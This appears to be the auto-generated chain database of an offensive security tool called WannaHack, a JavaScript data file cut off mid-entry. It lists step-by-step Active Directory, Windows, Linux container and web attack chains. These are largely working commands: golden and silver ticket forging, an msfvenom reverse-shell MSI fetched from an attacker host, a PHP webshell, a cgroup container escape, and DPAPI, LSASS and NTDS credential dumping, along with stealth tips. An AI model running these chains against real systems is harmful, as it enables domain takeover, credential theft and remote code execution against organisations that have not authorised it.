// WannaHack - Chain Database
// AUTO-GENERATED — do not edit manually.
// To add or modify chains, edit the YAML files in the chains/ directory.
// Then run: node build-chains.js

const CHAIN_DATA = {
  "chains": [
    {
      "id": "ad-persistence-golden-ticket",
      "name": "AD Persistence — Golden Ticket (krbtgt-signed)",
      "description": "Post-DA: extract the krbtgt NT hash, forge TGTs as any user for any service. The ticket is valid until krbtgt is reset TWICE (the rotation keeps the old key valid for one cycle). Long-term persistence.\n",
      "tags": [
        "persistence",
        "golden-ticket",
        "kerberos",
        "post-da",
        "active-directory"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "domain_sid",
          "description": "S-1-5-21-... domain SID.",
          "required": true
        },
        {
          "name": "krbtgt_nt_hash",
          "description": "NT hash of the krbtgt account (from DCSync).",
          "required": true
        },
        {
          "name": "impersonate_user",
          "description": "User to forge a TGT for (typically Administrator)."
        }
      ],
      "steps": [
        {
          "id": "get_domain_sid",
          "name": "Look up the domain SID if you don't have it",
          "inline_command": "impacket-lookupsid '<domain>/anonymous'@<dc-ip> 0 | head -5",
          "notes": "Or from a Pwn3d! host: `whoami /user` shows your SID; strip the\nlast RID for the domain SID. Or from BloodHound's domain node.\n"
        },
        {
          "id": "forge_ticket",
          "name": "Forge the Golden Ticket",
          "inline_command": "impacket-ticketer \\\n  -nthash '<krbtgt_hash>' \\\n  -domain-sid '<sid>' \\\n  -domain '<domain>' \\\n  <user>\n",
          "inputs": {
            "krbtgt_hash": "${krbtgt_nt_hash}",
            "sid": "${domain_sid}",
            "domain": "${domain}",
            "user": "${impersonate_user}"
          },
          "notes": "Creates `<user>.ccache` in the cwd. Default lifetime is 10 years —\ntune with `-duration`. For lateral discretion, match real ticket\nduration (10 hours).\n",
          "capture": [
            {
              "var": "golden_ccache",
              "regex": "Saving ticket in (\\S+\\.ccache)",
              "match": "first"
            }
          ]
        },
        {
          "id": "use_ticket",
          "name": "Use the ticket",
          "inline_command": "export KRB5CCNAME=<ccache>\n# Verify:\nklist\n# DCSync with the new identity:\nimpacket-secretsdump -k -no-pass '<domain>/<user>@<dc-fqdn>'\n# Or shell:\nimpacket-psexec -k -no-pass '<domain>/<user>@<dc-fqdn>'\n",
          "inputs": {
            "ccache": "${golden_ccache}",
            "domain": "${domain}",
            "user": "${impersonate_user}"
          },
          "notes": "Many CTF/lab setups expect FQDN, not IP, when using Kerberos\n(PKINIT/encryption depends on the SPN matching the host name).\nAdd the DC to /etc/hosts if needed: `<dc-ip> <domain> dc.<domain>`.\n"
        },
        {
          "id": "silver_ticket_alt",
          "name": "Or: Silver Ticket (single-service, even stealthier)",
          "inline_command": "impacket-ticketer \\\n  -nthash '<service_account_nt_hash>' \\\n  -domain-sid '<sid>' \\\n  -domain '<domain>' \\\n  -spn 'cifs/<target>.<domain>' \\\n  <user>\n",
          "inputs": {
            "sid": "${domain_sid}",
            "domain": "${domain}",
            "user": "${impersonate_user}"
          },
          "notes": "Silver Ticket = TGS for a specific service signed with the service\naccount's hash (e.g. MSSQLSvc, cifs, http). No DC interaction at all,\nbypasses krbtgt rotation, but only works for that single SPN.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Golden Ticket",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html"
        },
        {
          "title": "The Hacker Recipes — Golden Ticket",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets"
        }
      ]
    },
    {
      "id": "alwaysinstallelevated",
      "name": "Windows PE — AlwaysInstallElevated → MSI to SYSTEM",
      "description": "When both HKLM\\\\...\\\\Installer\\\\AlwaysInstallElevated and the matching HKCU key are 1, any user can install MSI packages elevated. msfvenom builds the payload in seconds.\n",
      "tags": [
        "windows",
        "priv-esc",
        "msi",
        "classic-windows"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "check_registry",
          "name": "Confirm AlwaysInstallElevated = 1 in HKLM + HKCU",
          "inline_command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n",
          "notes": "BOTH must return `REG_DWORD 0x1`. If only one is set, this won't work.\n"
        },
        {
          "id": "craft_msi",
          "name": "Craft the MSI payload (attacker box)",
          "inline_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o /tmp/install.msi",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        },
        {
          "id": "transfer",
          "name": "Transfer to target (any method)",
          "inline_command": "# attacker: python3 -m http.server 80\n# victim: certutil -urlcache -f http://<lhost>/install.msi C:\\Windows\\Temp\\install.msi",
          "inputs": {
            "lhost": "${attacker_ip}"
          }
        },
        {
          "id": "install",
          "name": "Trigger msiexec /quiet",
          "inline_command": "msiexec /quiet /qn /i C:\\Windows\\Temp\\install.msi",
          "notes": "`/quiet /qn` suppresses UI. No need for elevation prompts thanks to\nthe policy. Reverse shell comes back as SYSTEM.\n"
        },
        {
          "id": "confirm",
          "name": "Catch the reverse shell",
          "inline_command": "nc -lvnp <lport>; # then `whoami` → nt authority\\system",
          "inputs": {
            "lport": "4444"
          }
        }
      ],
      "references": [
        {
          "title": "HackTricks — AlwaysInstallElevated",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated"
        }
      ]
    },
    {
      "id": "asrep-to-shell",
      "name": "AS-REP Roast → Crack → Evil-WinRM",
      "description": "Discover Active Directory accounts that have Kerberos pre-auth disabled, harvest their AS-REP responses, crack them offline, and use the recovered password to open an Evil-WinRM shell on the Domain Controller.\n",
      "tags": [
        "kerberos",
        "asreproast",
        "credential-attack",
        "lateral-movement",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "description": "Domain Controller IP.",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "description": "Active Directory domain (e.g. corp.local).",
          "source": "target_context.domain",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enum_asrep_users",
          "name": "Find AS-REP-roastable users",
          "command_ref": "nxc-ldap-asreproasting",
          "notes": "Unauthenticated variant requires a users.txt wordlist. With any valid\nLDAP-readable credential (even a low-priv account) the call returns\nevery account with DONT_REQ_PREAUTH set.\n",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "output.txt": "asrep.hashes"
          },
          "capture": [
            {
              "var": "asrep_hashes",
              "regex": "\\$krb5asrep\\$.+",
              "match": "all"
            },
            {
              "var": "roastable_users",
              "regex": "\\$krb5asrep\\$[0-9]+\\$([A-Za-z0-9._-]+)@",
              "match": "all"
            }
          ]
        },
        {
          "id": "crack_asrep",
          "name": "Crack AS-REP hashes offline",
          "command_ref": "hashcat-asrep",
          "requires": [
            "asrep_hashes"
          ],
          "inputs": {
            "hash_file": "asrep.hashes"
          },
          "capture": [
            {
              "var": "cracked_creds",
              "regex": "^(\\$krb5asrep\\$[^:]+):(.+)$",
              "match": "all",
              "groups": {
                "hash": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "get_shell",
          "name": "Authenticate with the cracked password",
          "command_ref": "evil-winrm",
          "requires": [
            "cracked_creds"
          ],
          "notes": "The runner shows the Evil-WinRM card with its built-in variations\n(password / NTLM hash / Kerberos ticket). Pick the one matching what\nyou cracked. Most often this is the password path.\n"
        }
      ],
      "references": [
        {
          "title": "AS-REP Roasting — The Hacker Recipes",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
        },
        {
          "title": "Evil-WinRM",
          "url": "https://github.com/Hackplayers/evil-winrm"
        }
      ]
    },
    {
      "id": "dacl-genericall-abuse",
      "name": "AD — DACL abuse (GenericAll/Write/ForceChangePassword)",
      "description": "BloodHound shows you have GenericAll / GenericWrite / WriteDacl / ForceChangePassword on a target principal. Cash it in. Three common payoffs depending on the right: reset the password, add yourself to a group, or stage a shadow-credential.\n",
      "tags": [
        "dacl-abuse",
        "bloodhound",
        "priv-esc",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        },
        {
          "name": "target_principal",
          "description": "User/group/computer you have rights over.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_dacl",
          "name": "Confirm the ACE in BloodHound",
          "inline_command": "echo 'BloodHound query: MATCH p=(n {name:\"<USER>@<DOMAIN>\"}-[r:GenericAll|GenericWrite|WriteDacl|ForceChangePassword]->(m {name:\"<TARGET>@<DOMAIN>\"})) RETURN p'",
          "notes": "Pick the path based on what you have:\n • GenericAll on USER         → ForceChangePassword OR Shadow Creds\n • GenericWrite on USER       → Shadow Creds (msDS-KeyCredentialLink)\n • GenericAll on GROUP        → AddMember\n • GenericAll on COMPUTER     → Shadow Creds OR RBCD (see other chain)\n"
        },
        {
          "id": "read_dacl",
          "name": "Read DACL via NetExec to confirm",
          "command_ref": "nxc-ldap-daclread",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          }
        },
        {
          "id": "branch_action",
          "branch": [
            {
              "when": "target_principal",
              "label": "Force password reset (if GenericAll/ForceChangePassword on a user)",
              "command_ref": "bloodyad-set-password"
            },
            {
              "when": "target_principal",
              "label": "Add user to a group (if GenericAll on the group)",
              "command_ref": "bloodyad-add-groupmember"
            },
            {
              "when": "target_principal",
              "label": "Shadow credentials (silent — preferred)",
              "command_ref": "bloodyad-shadow-credentials"
            }
          ]
        },
        {
          "id": "validate",
          "name": "Validate access with the new credential",
          "inline_command": "nxc smb <dc-ip> -u '<target_principal>' -p '<new_password>'",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "target_principal": "${target_principal}"
          },
          "notes": "Then either BloodHound the new identity for further paths, or jump\nto evil-winrm / secretsdump / kerberoast depending on the role.\n"
        }
      ],
      "references": [
        {
          "title": "BloodHound DACL edges",
          "url": "https://bloodhound.specterops.io/resources/edges/generic-all"
        },
        {
          "title": "bloodyAD",
          "url": "https://github.com/CravateRouge/bloodyAD"
        }
      ]
    },
    {
      "id": "docker-breakout",
      "name": "Linux PE — Docker/LXD container & group breakout",
      "description": "Being in the `docker` group is equivalent to root. Same for `lxd`. Once inside a container with privileged or shared-fs mounts, the host is one command away. This chain covers the three most common patterns.\n",
      "tags": [
        "linux",
        "priv-esc",
        "docker",
        "lxd",
        "container-breakout"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "check_groups",
          "name": "Check group membership",
          "inline_command": "id; groups",
          "notes": "`docker` or `lxd` group → instant root (steps below).\nNo group? Skip to step 5 (escape from inside the container).\n"
        },
        {
          "id": "docker_group_breakout",
          "name": "User in `docker` group → root on host",
          "inline_command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
          "notes": "Mount the host root filesystem inside an alpine container, chroot\ninto it → root on the host. Works on any host where the user can\nreach the docker daemon.\n"
        },
        {
          "id": "lxd_breakout",
          "name": "User in `lxd` group → root on host",
          "inline_command": "# 1) Get a minimal Alpine image:\nwget https://github.com/saghul/lxd-alpine-builder/releases/latest/download/alpine-v3.18-x86_64.tar.gz -O /tmp/alpine.tar.gz\nlxc image import /tmp/alpine.tar.gz --alias alpine\nlxc init alpine pwned -c security.privileged=true\nlxc config device add pwned host disk source=/ path=/mnt/host recursive=true\nlxc start pwned\nlxc exec pwned -- chroot /mnt/host sh\n"
        },
        {
          "id": "container_capabilities",
          "name": "Inside a container — check capabilities & mounts",
          "inline_command": "capsh --print 2>/dev/null; mount | grep -E 'cgroup|docker|proc'",
          "notes": "cap_sys_admin present → many escapes possible (release_agent trick).\n`/proc` from host mounted → write to /proc/sys/kernel/core_pattern.\nDocker socket mounted (`/var/run/docker.sock`) → call back to the\ndaemon, run a new container with `-v /:/mnt`.\n"
        },
        {
          "id": "privileged_breakout",
          "name": "Privileged container → release_agent trick",
          "inline_command": "mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\nprintf '#!/bin/sh\\nps > /output' > /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n",
          "notes": "Classic privileged-container escape. `/output` ends up on the host.\n"
        }
      ],
      "references": [
        {
          "title": "Docker group → root",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#docker-group"
        },
        {
          "title": "LXD breakout",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#lxd-group"
        },
        {
          "title": "Container escape patterns",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html"
        }
      ]
    },
    {
      "id": "dpapi-secrets-extraction",
      "name": "Cred Access — DPAPI masterkey & blob extraction",
      "description": "Once you have local admin on a Windows host, DPAPI blobs decode every vault entry (RDP creds, Chrome cookies/passwords, scheduled-task secrets). The chain captures masterkeys + decrypts blobs without ever touching the user's plaintext password.\n",
      "tags": [
        "credential-access",
        "dpapi",
        "post-exploitation",
        "windows"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "dpapi_remote",
          "name": "Remote DPAPI dump via NetExec",
          "command_ref": "nxc-dpapi-hash",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Pulls credentials cached by every user that logged in. Watch for\n`LegacyGeneric:target=`, `Domain:target=`, and `MicrosoftAccount:`\nentries — those become PtH/PtT candidates for lateral movement.\n",
          "capture": [
            {
              "var": "dpapi_secrets",
              "regex": "\\[\\+\\]\\s+Decrypted secret:\\s*(.+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "lsa_secrets",
          "name": "Also grab SAM/LSA secrets",
          "command_ref": "nxc-smb-sam-lsa",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "ntlm_hashes",
              "regex": "^([A-Za-z0-9._$-]+):(\\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
              "match": "all",
              "groups": {
                "user": 1,
                "rid": 2,
                "lm": 3,
                "nt": 4
              }
            }
          ]
        },
        {
          "id": "lsassy",
          "name": "Optionally also dump LSASS (in-memory creds)",
          "command_ref": "nxc-lsassy",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Use only when you accept the EDR risk. Many CTF boxes don't have\nDefender enabled. Also try `--method nanodump` for stealthier dumps.\n"
        }
      ],
      "references": [
        {
          "title": "DPAPI internals",
          "url": "https://www.synacktiv.com/en/publications/operational-guidance-for-offensive-dpapi-abuse.html"
        },
        {
          "title": "HackTricks — DPAPI",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dpapi-extracting-passwords.html"
        }
      ]
    },
    {
      "id": "esc1-adcs-takeover",
      "name": "ADCS ESC1 — request cert as anyone, become DA",
      "description": "Find a Certificate Template with ENROLLEE_SUPPLIES_SUBJECT enabled and enroll rights for low-priv users, then request a cert with the Administrator UPN in the SAN. Authenticate via PKINIT and recover the target user's NT hash.\n",
      "tags": [
        "adcs",
        "esc1",
        "priv-esc",
        "certificates",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_templates",
          "name": "Enumerate the CA and vulnerable templates",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Look at the report: any template marked `[!] Vulnerabilities: ESC1`\nwith `Enrollment Rights: Domain Users` (or your user's groups) is a\ngo. Record the template name and the issuing CA name.\n",
          "capture": [
            {
              "var": "vuln_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC1",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "\\[Certificate Authority\\][\\s\\S]*?CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "request_cert",
          "name": "Request cert with Administrator UPN in SAN",
          "command_ref": "certipy-esc1",
          "requires": [
            "vuln_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${vuln_template}",
            "target_user": "administrator"
          },
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "PKINIT auth with the cert → DA NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dcsync",
          "name": "DCSync with the recovered DA hash",
          "command_ref": "secretsdump",
          "requires": [
            "dc_nt_hash"
          ],
          "notes": "Use the NTLM-hash variation of secretsdump. The recovered hash IS\nAdministrator's NT — at this point the domain is compromised.\n"
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned (ADCS attacks)",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        },
        {
          "title": "Certipy README",
          "url": "https://github.com/ly4k/Certipy"
        }
      ]
    },
    {
      "id": "file-upload-bypass",
      "name": "Web → Shell — file upload bypass → webshell",
      "description": "Upload form with naive filtering. Try the standard tricks in order (extension blacklist → content-type → magic bytes → double extension → null-byte / .htaccess → polyglot) until one webshell lands and executes.\n",
      "tags": [
        "web",
        "file-upload",
        "webshell",
        "rce"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "upload_url",
          "description": "POST endpoint that accepts the upload.",
          "required": true
        },
        {
          "name": "served_path",
          "description": "Where uploaded files end up (e.g. /uploads/).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "bench_baseline",
          "name": "Baseline: upload a harmless file, see what's accepted",
          "inline_command": "curl -F 'file=@hello.txt' '<upload_url>'",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "extension_swap",
          "name": "Try alternate PHP-handled extensions",
          "inline_command": "for ext in php php3 php5 phtml phar pht; do\n  cp shell.php \"shell.$ext\"\n  curl -F \"file=@shell.$ext\" \"<upload_url>\" | tail -3\ndone\n",
          "inputs": {
            "upload_url": "${upload_url}"
          },
          "notes": "Many blacklists block .php but not .phtml/.phar. JSP equivalents:\n.jsp, .jspx, .jsw, .jsv. ASP equivalents: .asp, .aspx, .ashx, .asmx,\n.config.\n"
        },
        {
          "id": "content_type_spoof",
          "name": "Force Content-Type: image/*",
          "inline_command": "curl -F 'file=@shell.php;type=image/png' '<upload_url>'",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "magic_byte_prefix",
          "name": "Prefix with PNG magic bytes (polyglot)",
          "inline_command": "printf '\\\\x89PNG\\\\r\\\\n\\\\x1a\\\\n' > shell.png.php\ncat shell.php >> shell.png.php\ncurl -F 'file=@shell.png.php' '<upload_url>'\n",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "htaccess_trick",
          "name": "If .htaccess writable: turn .jpg into PHP",
          "inline_command": "printf 'AddType application/x-httpd-php .jpg\\n' > .htaccess\ncurl -F 'file=@.htaccess' '<upload_url>'\ncurl -F 'file=@shell.jpg' '<upload_url>'   # now executes as PHP\n",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "trigger",
          "name": "Hit the uploaded path",
          "inline_command": "curl '<served_path>/shell.php?cmd=id'",
          "inputs": {
            "served_path": "${served_path}"
          },
          "notes": "Drop a minimal one-liner webshell:\n  <?php system($_GET['cmd']); ?>\nThen escalate to a reverse shell with the rsg-* commands in the\npayloads category.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — File Upload",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"
        },
        {
          "title": "PayloadsAllTheThings — Upload Insecure Files",
          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
        }
      ]
    },
    {
      "id": "gpp-cpassword-recovery",
      "name": "Cred Access — GPP cpassword recovery (MS14-025)",
      "description": "Pre-MS14-025 Group Policy Preferences stored encrypted passwords in SYSVOL with the AES key Microsoft accidentally published. Any authenticated user can read those XML files. Still a freebie on legacy AD networks.\n",
      "tags": [
        "credential-access",
        "gpp",
        "sysvol",
        "group-policy",
        "classic-windows"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "search_gpp",
          "name": "Grep SYSVOL for cpassword XML",
          "command_ref": "nxc-smb-gpp-password",
          "inputs": {
            "ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "gpp_cred",
              "regex": "(?:Found credentials|Decrypted password)[:\\s]+(.+)",
              "match": "first"
            }
          ]
        },
        {
          "id": "also_autologin",
          "name": "Check Registry-stored autologon creds (winlogon)",
          "command_ref": "nxc-smb-gpp-autologin",
          "inputs": {
            "ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Some Windows servers store DefaultPassword in HKLM\\Software\\Microsoft\\\nWindows NT\\CurrentVersion\\Winlogon. Still common on kiosks / RDP\njumpboxes.\n"
        },
        {
          "id": "validate",
          "name": "Validate the recovered credential",
          "inline_command": "nxc smb <ip> -u '<user>' -p '<found_pwd>'",
          "requires": [
            "gpp_cred"
          ],
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "GPP creds frequently belong to legacy admin accounts or scheduled-task\nservice users — usually Pwn3d! on multiple boxes.\n"
        }
      ],
      "references": [
        {
          "title": "MS14-025 GPP password disclosure",
          "url": "https://msrc.microsoft.com/update-guide/en-US/advisory/MS14-025"
        },
        {
          "title": "HackTricks — GPP",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html"
        }
      ]
    },
    {
      "id": "kerberoast-chain",
      "name": "Kerberoast → Crack → Lateral Move",
      "description": "With one valid domain credential, request TGS tickets for every account that has a ServicePrincipalName set, crack them offline, then reuse the recovered service-account password to dump secrets from the DC.\n",
      "tags": [
        "kerberos",
        "kerberoast",
        "credential-attack",
        "lateral-movement",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "roast",
          "name": "Request TGS tickets for SPN accounts",
          "command_ref": "kerberoasting",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "tgs_hashes",
              "regex": "\\$krb5tgs\\$.+",
              "match": "all"
            },
            {
              "var": "kerberoastable_users",
              "regex": "\\$krb5tgs\\$[0-9]+\\*([A-Za-z0-9._$-]+)\\$",
              "match": "all"
            }
          ]
        },
        {
          "id": "crack",
          "name": "Crack TGS hashes offline",
          "command_ref": "Cracking-Kerberoasting-hashes",
          "requires": [
            "tgs_hashes"
          ],
          "capture": [
            {
              "var": "cracked_service_creds",
              "regex": "^\\$krb5tgs\\$[^:]+:(.+)$",
              "match": "all",
              "transform": "trim"
            }
          ]
        },
        {
          "id": "dump_secrets",
          "name": "Dump NTDS via the service account",
          "notes": "Many service accounts (especially SQL/IIS principals) are members of\nprivileged groups. If the cracked principal can DCSync, secretsdump\npulls every NTLM hash from the DC.\n",
          "command_ref": "secretsdump",
          "requires": [
            "cracked_service_creds"
          ]
        }
      ],
      "references": [
        {
          "title": "Kerberoasting — The Hacker Recipes",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
        },
        {
          "title": "Impacket secretsdump",
          "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
        }
      ]
    },
    {
      "id": "ldap-anonymous-enum",
      "name": "Recon — LDAP anonymous / authenticated enum",
      "description": "Walk the directory: domain name, naming contexts, computers, users, privileged groups, kerberoastable & AS-REP-roastable principals. With even one valid credential, LDAP gives you the topology of the domain.\n",
      "tags": [
        "recon",
        "ldap",
        "active-directory",
        "enumeration"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "description": "Any valid domain user (or '' for anonymous bind).",
          "source": "target_context.user"
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "dc_basic",
          "name": "DC fingerprint + naming context",
          "command_ref": "nxc-ldap-dc-list",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "domain",
              "regex": "^[A-Z]+\\s+\\S+\\s+\\d+\\s+\\S+\\s+\\[\\*\\]\\s+([A-Za-z0-9.-]+)",
              "match": "first"
            }
          ]
        },
        {
          "id": "asreproastable",
          "name": "AS-REP-roastable users",
          "command_ref": "nxc-ldap-asreproasting",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "output.txt": "asrep.hashes"
          },
          "capture": [
            {
              "var": "asrep_hashes",
              "regex": "\\$krb5asrep\\$.+",
              "match": "all"
            }
          ],
          "notes": "Hand off straight to the asrep-to-shell chain if any hashes pop.\n"
        },
        {
          "id": "kerberoastable",
          "name": "Kerberoastable accounts",
          "command_ref": "nxc-ldap-kerberoasting",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "output.txt": "tgs.hashes"
          },
          "capture": [
            {
              "var": "tgs_hashes",
              "regex": "\\$krb5tgs\\$.+",
              "match": "all"
            }
          ]
        },
        {
          "id": "delegation",
          "name": "Find delegation (unconstrained / RBCD candidates)",
          "command_ref": "nxc-ldap-find-delegation",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Unconstrained → printer-bug chain. Constrained → S4U2proxy abuse.\nRBCD-writable → RBCD takeover chain.\n"
        },
        {
          "id": "bloodhound_collect",
          "name": "BloodHound data collection",
          "command_ref": "bloodhound-ce-python",
          "requires": [
            "domain"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "domain": "${domain}"
          },
          "notes": "Ingest the resulting zips into BloodHound CE and run the built-in\npaths: \"Shortest paths to Domain Admin\", \"Find AS-REP-roastable users\",\n\"Find computers with unconstrained delegation\".\n"
        }
      ],
      "references": [
        {
          "title": "The Hacker Recipes — AD",
          "url": "https://www.thehacker.recipes/ad/movement/"
        },
        {
          "title": "BloodHound queries",
          "url": "https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart"
        }
      ]
    },
    {
      "id": "lfi-to-rce-log-poison",
      "name": "Web → Shell — LFI + log poisoning → RCE",
      "description": "Local File Inclusion in PHP/JSP apps lets you read arbitrary files. The classic upgrade to RCE: write PHP code into a log the web server controls, then include the log via LFI. Works on Apache access.log, /proc/self/environ, mail logs, session files.\n",
      "tags": [
        "web",
        "lfi",
        "log-poisoning",
        "rce",
        "php"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "Vulnerable URL with the LFI parameter, e.g. http://target/index.php?page=",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_lfi",
          "name": "Confirm LFI (read a known file)",
          "inline_command": "curl -s '<url>../../../../etc/passwd' | head -10",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Try `../../../../etc/passwd`, `/etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`.\nThe php://filter trick gives you source — read every script to find\ncredentials, db config, and other endpoints.\n"
        },
        {
          "id": "php_wrapper_check",
          "name": "Check for PHP wrappers",
          "inline_command": "curl -s '<url>php://filter/convert.base64-encode/resource=index.php' | base64 -d\ncurl -s -d '<?php system($_GET[\"c\"]); ?>' '<url>php://input&c=id'\ncurl -s '<url>data:text/plain,<?php phpinfo(); ?>'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "php://input + data:// often give straight RCE without log poisoning.\nTry these first — much cleaner.\n"
        },
        {
          "id": "log_poison",
